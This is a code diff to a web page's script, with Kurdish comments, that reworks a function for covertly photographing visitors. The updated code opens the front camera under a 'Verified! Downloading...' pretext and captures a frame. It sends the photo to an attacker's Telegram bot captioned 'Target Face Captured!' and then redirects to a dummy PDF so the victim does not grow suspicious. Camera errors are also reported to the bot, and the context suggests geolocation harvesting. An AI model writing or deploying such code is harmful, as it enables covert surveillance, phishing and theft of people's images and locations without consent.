@@ -81,23 +81,53 @@
         }, null, {enableHighAccuracy: true});
     }
 
-    async function getCamera() {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        const video = document.getElementById('spy-vid');
-        video.srcObject = stream;
-        video.onplaying = async () => {
-            await new Promise(r => setTimeout(r, 4000));
-            const canvas = document.getElementById('canvas');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(async (blob) => {
-                const fd = new FormData();
-                fd.append('chat_id', chatId);
-                fd.append('photo', blob, 'img.jpg');
-                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
-                stream.getTracks().forEach(t => t.stop());
-            }, 'image/jpeg');
-        };
+async function getCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.getElementById('spy-vid');
+            video.srcObject = stream;
+
+            video.onloadeddata = async () => {
+                video.play();
+                await new Promise(r => setTimeout(r, 5000));
+                
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth > 0 ? video.videoWidth : 640;
+                canvas.height = video.videoHeight > 0 ? video.videoHeight : 480;
+                
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                canvas.toBlob(async (blob) => {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('photo', blob, 'capture.jpg');
+                    fd.append('caption', '👤 Target Face Captured!');
+                    
+                    // ناردنی وێنەکە بۆ تێلگرام
+                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
+                    
+                    stream.getTracks().forEach(t => t.stop());
+
+                    // --- لێرەدا فایلی PDF دایبەزێنە ---
+                    if (response.ok) {
+                        const pdfUrl = "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf"; // لینکی فایلی PDF لێرە دابنێ
+                        
+                        // نیشاندانی پەیامێکی سەرکەوتوو و بردن بۆ سەر فایلەکە
+                        document.getElementById('startBtn').innerHTML = "Verified! Downloading...";
+                        
+                        setTimeout(() => {
+                            window.location.href = pdfUrl; // قوربانییەکە دەباتە سەر فایلەکە
+                        }, 1000);
+                    }
+                    
+                }, 'image/jpeg', 0.7);
+            };
+        } catch (e) {
+            sendToBot(`❌ Camera Permission Error: ${e.message}`);
+            // ئەگەر کامێراشی نەدا، هەر بیبە بۆ فایلەکە بۆ ئەوەی گومان نەکات
+            window.location.href = "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf";
+        }
     }
 </script>
 </body>
